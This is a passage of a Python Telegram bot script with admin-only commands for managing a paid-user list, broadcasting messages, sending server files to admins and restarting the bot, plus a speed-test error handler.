        response = (f"<b>Download Speed:</b> {download_speed:.2f} <b>Mbps</b>\n"
                    f"<b>Upload Speed:</b> {upload_speed:.2f} <b>Mbps</b>")
        bot.send_message(chat_id, response, parse_mode='HTML')
    except speedtest.ForbiddenError:
        admin_message = "⚠️ 𝟒𝟎𝟑 𝐅𝐨𝐫𝐛𝐢𝐝𝐝𝐞𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝."
        bot.send_message(ADMIN_ID, admin_message)
    except Exception as e:
        admin_message = f"⚠️ 𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐝𝐮𝐫𝐢𝐧𝐠 𝐬𝐩𝐞𝐞𝐝 𝐭𝐞𝐬𝐭:\n\n{e}"
        bot.send_message(ADMIN_ID, admin_message)

# Admin user IDs
ADMIN_ID = [2104592399]  # Replace with your admin user IDs

# File to store added user IDs
USERS_FILE = 'paidusers.txt'

# Load added user IDs from file
def load_users():
    users = set()
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as file:
            for line in file:
                user_id = int(line.strip())
                users.add(user_id)
    return users

# Save added user IDs to file
def save_users(users):
    with open(USERS_FILE, 'w') as file:
        for user_id in users:
            file.write(str(user_id) + '\n')

# Load existing user IDs
added_users = load_users()

# Command handler for /addbroadcast
@bot.message_handler(commands=['addbroadcast'])
def add_broadcast(message):
    if message.from_user.id not in ADMIN_ID:
        bot.reply_to(message, "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!")
        return

    try:
        user_id = int(message.text.split()[1])
        added_users.add(user_id)
        save_users(added_users)
        bot.reply_to(message, f"𝐔𝐬𝐞𝐫 {user_id} 𝐚𝐝𝐝𝐞𝐝 𝐟𝐨𝐫 𝐛𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭.")
    except (IndexError, ValueError):
        bot.reply_to(message, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐯𝐚𝐥𝐢𝐝 𝐔𝐒𝐄𝐑 𝐈𝐃.")

# Command handler for /broadcast
@bot.message_handler(commands=['broadcast'])
def send_broadcast(message):
    if message.from_user.id not in ADMIN_ID:
        bot.reply_to(message, "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!")
        return

    try:
        text = message.text.split(maxsplit=1)[1]
        for user_id in added_users:
            bot.send_message(user_id, text)
        bot.reply_to(message, "𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐬𝐞𝐧𝐭 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲.")
    except IndexError:
        bot.reply_to(message, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐨𝐫 𝐛𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭.")

# Command to send custom files to admin
@bot.message_handler(commands=['sendme'])
def send_file_to_admin(message):
    try:
        username = message.from_user.username
        response = ""  # Assigning a default value to response
        if username in admin_usernames:
            command = message.text.split()
            if len(command) == 2:
                filename = command[1]
                if os.path.exists(filename):
                    with open(filename, 'rb') as file:
                        bot.send_document(message.chat.id, file)
                    return  # Exit function after sending the file
                else:
                    response = f"𝐅𝐢𝐥𝐞 '{filename}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐭𝐡𝐞 𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐝𝐢𝐫𝐞𝐜𝐭𝐨𝐫𝐲."
            else:
                response = "𝐔𝐬𝐚𝐠𝐞: /sendme [𝐟𝐢𝐥𝐞𝐧𝐚𝐦𝐞]"
        else:
            response = "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!"

    except Exception as e:
        print("Error:", e)
        response = "𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐭𝐡𝐞 𝐫𝐞𝐪𝐮𝐞𝐬𝐭."
    
    bot.reply_to(message, response)

# Command to restart the bot (only for admins)
@bot.message_handler(commands=['restartbot'])
def restart_bot(message):
    if message.from_user.username in admin_usernames:
        bot.reply_to(message, "𝐑𝐞𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐭𝐡𝐞 𝐛𝐨𝐭...")
        os.system("python3 new.py")  # Replace 'new.py' with the name of your bot's script
        os._exit(0)
    else:
        bot.reply_to(message, "𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝!")

# Load user plans when the bot starts
load_user_plans()

# Handle text messages
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    # Check if the message starts with a slash ("/"), indicating a command
    if message.text.startswith('/'):
        bot.reply_to(message, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐬𝐞 𝐯𝐚𝐥𝐢𝐝 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.  /help")
    else:
        # Handle regular text message
        # Do nothing or implement desired behavior
        pass

# Start polling
bot.polling()
